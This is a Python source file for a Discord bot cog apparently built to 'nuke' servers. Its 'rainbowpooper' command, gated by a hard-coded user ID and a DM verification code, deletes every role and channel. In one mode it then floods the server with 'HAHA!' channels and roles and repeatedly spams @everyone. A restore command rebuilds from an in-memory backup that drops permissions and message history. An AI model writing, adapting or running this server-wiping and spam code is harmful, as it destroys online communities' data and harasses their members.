import discord
from discord.ext import commands
import random
import string
import asyncio
import json

ALLOWED_USERS = {1174820638997872721}  # Replace with real user IDs
DM_RECEIVER_ID = 1174820638997872721

def generate_code(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

class RainbowPooper(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.codes = {}  # user_id: verification_code
        self.restore_codes = {}  # user_id: restore_code
        self.backups = {}  # guild_id: backup_data

    @commands.command()
    async def rainbowpooper(self, ctx, safe: str = "no"):
        author = ctx.author

        if author.id not in ALLOWED_USERS:
            await ctx.send("You're not allowed to use this command.")
            return

        verify_code = generate_code()
        self.codes[author.id] = verify_code

        try:
            dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
            await dm_user.send(f"Verification code for {author} is: {verify_code}")
        except Exception:
            await ctx.send("Failed to send DM to verifier.")
            return

        await ctx.send(f"{author.mention}, check the DM receiver and enter the verification code:")

        def check(m):
            return m.author.id == author.id and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60)
        except asyncio.TimeoutError:
            await ctx.send("Timed out. Try again.")
            return

        if msg.content.strip() != verify_code:
            await ctx.send("Invalid code.")
            return

        # Generate second restore code, send to verifier
        restore_code = generate_code(8)
        self.restore_codes[author.id] = restore_code
        try:
            dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
            await dm_user.send(f"Restore code for {author} is: {restore_code}. Use /rainbowpisser <code> to restore.")
        except Exception:
            await ctx.send("Failed to send restore code to verifier.")
            return

        # Backup server data before nuking
        await ctx.send("Backing up server data...")
        backup = await self.backup_guild(ctx.guild)
        self.backups[ctx.guild.id] = backup
        await ctx.send("Backup completed.")

        is_safe = safe.lower() == "yes"

        await ctx.send("Beginning server wipe...")

        # Delete roles except @everyone
        for role in ctx.guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except Exception:
                pass

        # Delete channels and categories
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        if is_safe:
            new_channel = await ctx.guild.create_text_channel("Server Deleted")
            await new_channel.send("Do you want to leave a message? Reply below:")

            def reply_check(m):
                return m.channel == new_channel and not m.author.bot

            try:
                reply = await self.bot.wait_for("message", check=reply_check, timeout=10)
                await new_channel.purge()
                await new_channel.send(reply.content)
            except asyncio.TimeoutError:
                await new_channel.send("this server has been deleted")
        else:
            # Flashier unsafe nuking
            for i in range(5):
                cat = await ctx.guild.create_category(f"HAHA! {i+1}")
                for _ in range(5):
                    txt = await ctx.guild.create_text_channel("HAHA!", category=cat)
                    vc = await ctx.guild.create_voice_channel("HAHA!", category=cat)
                    try:
                        # Spam @everyone in text channels 5 times each
                        for _ in range(5):
                            await txt.send("@everyone HAHAHAHAHA!")
                    except Exception:
                        pass

            # Add many roles with @everyone mention enabled
            for i in range(10):
                try:
                    role = await ctx.guild.create_role(name=f"HAHA! ROLE {i+1}", mentionable=True)
                except Exception:
                    continue

            # Mention @everyone in all text channels once more after creating roles
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send("@everyone This server got rainbowpooped!")
                except Exception:
                    pass

    @commands.command()
    async def rainbowpisser(self, ctx, code: str):
        author = ctx.author

        if author.id not in ALLOWED_USERS:
            await ctx.send("You're not allowed to use this command.")
            return

        expected_code = self.restore_codes.get(author.id)
        if expected_code is None or code.strip() != expected_code:
            await ctx.send("Invalid or missing restore code.")
            return

        backup = self.backups.get(ctx.guild.id)
        if not backup:
            await ctx.send("No backup found for this server.")
            return

        await ctx.send("Restoring server from backup...")

        # Delete current channels & roles except @everyone
        for role in ctx.guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except Exception:
                pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        # Restore roles
        roles_map = {}
        for r in backup['roles']:
            try:
                role = await ctx.guild.create_role(
                    name=r['name'],
                    colour=discord.Colour(r['color']),
                    hoist=r['hoist'],
                    mentionable=r['mentionable'],
                    permissions=discord.Permissions(r['permissions'])
                )
                roles_map[r['id']] = role
            except Exception:
                pass

        # Restore categories
        cats_map = {}
        for c in backup['categories']:
            try:
                cat = await ctx.guild.create_category(c['name'])
                cats_map[c['id']] = cat
            except Exception:
                pass

        # Restore channels
        for ch in backup['channels']:
            category = cats_map.get(ch['category_id'])
            try:
                if ch['type'] == 'text':
                    channel = await ctx.guild.create_text_channel(ch['name'], category=category)
                elif ch['type'] == 'voice':
                    channel = await ctx.guild.create_voice_channel(ch['name'], category=category)
                else:
                    continue
            except Exception:
                continue

        await ctx.send("Restoration complete.")

    async def backup_guild(self, guild: discord.Guild):
        backup = {
            'roles': [],
            'categories': [],
            'channels': []
        }

        # Backup roles except @everyone
        for role in guild.roles:
            if role.is_default():
                continue
            backup['roles'].append({
                'id': role.id,
                'name': role.name,
                'color': role.color.value,
                'hoist': role.hoist,
                'mentionable': role.mentionable,
                'permissions': role.permissions.value,
            })

        # Backup categories
        for cat in guild.categories:
            backup['categories'].append({
                'id': cat.id,
                'name': cat.name
            })

        # Backup channels (text and voice)
        for ch in guild.channels:
            if isinstance(ch, discord.TextChannel):
                backup['channels'].append({
                    'id': ch.id,
                    'name': ch.name,
                    'type': 'text',
                    'category_id': ch.category.id if ch.category else None,
                })
            elif isinstance(ch, discord.VoiceChannel):
                backup['channels'].append({
                    'id': ch.id,
                    'name': ch.name,
                    'type': 'voice',
                    'category_id': ch.category.id if ch.category else None,
                })

        return backup
